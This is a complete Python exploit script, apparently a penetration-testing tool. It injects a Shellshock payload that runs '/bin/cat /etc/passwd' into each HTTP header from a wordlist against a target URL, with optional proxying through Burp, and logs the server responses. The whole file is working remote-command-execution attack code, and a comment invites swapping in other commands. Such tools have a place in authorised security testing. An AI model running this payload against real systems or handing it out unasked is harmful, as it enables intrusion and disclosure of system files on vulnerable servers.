#!/usr/bin/env python3

import argparse
import requests

def send_request_with_header(url, header_name, payload, proxy, file):
    # Construct the header with the Shellshock payload
    headers = {header_name: payload}

    # If a proxy is specified, set up the proxy configuration
    proxies = {"http": proxy, "https": proxy} if proxy else None

    # Make the request with the constructed header and proxy
    response = requests.get(url, headers=headers, proxies=proxies)

    # Print the header and the status code to see which headers are being sent and the response
    print(f"Sent header: {header_name}, Status Code: {response.status_code}")

    # Write the header, status code, and response to the file
    file.write(f"Sent header: {header_name}, Status Code: {response.status_code}\n\n{response.text}\n\n")

def main(headers_file, url, proxy):
    # Define the Shellshock payload change this using full binary paths if you want a different payload to run e.g /bin/whoami
    payload = "() { :; }; echo; echo; /bin/cat /etc/passwd"

    # Open the file to save responses
    with open("responses.txt", "w") as file:
        # Read header names from the file and send requests one by one
        with open(headers_file, 'r') as headers:
            for line in headers:
                header_name = line.strip()
                send_request_with_header(url, header_name, payload, proxy, file)

    # Print the completion message
    print("[+]: Script completed, please find response results in responses.txt")

if __name__ == "__main__":
    # Setup argument parsing
    parser = argparse.ArgumentParser(description='Send requests with each header individually containing a Shellshock payload and save responses.')
    parser.add_argument('-w', '--wordlist', required=True, help='Path to the wordlist file containing header names.')
    parser.add_argument('-url', required=True, help='The target URL.')
    parser.add_argument('-p', '--proxy', required=False, help='Optional proxy URL (e.g., http://127.0.0.1:8080 for Burp or Fiddler).')

    # Parse the arguments
    args = parser.parse_args()

    # Call the main function with the parsed arguments
    main(args.wordlist, args.url, args.proxy)
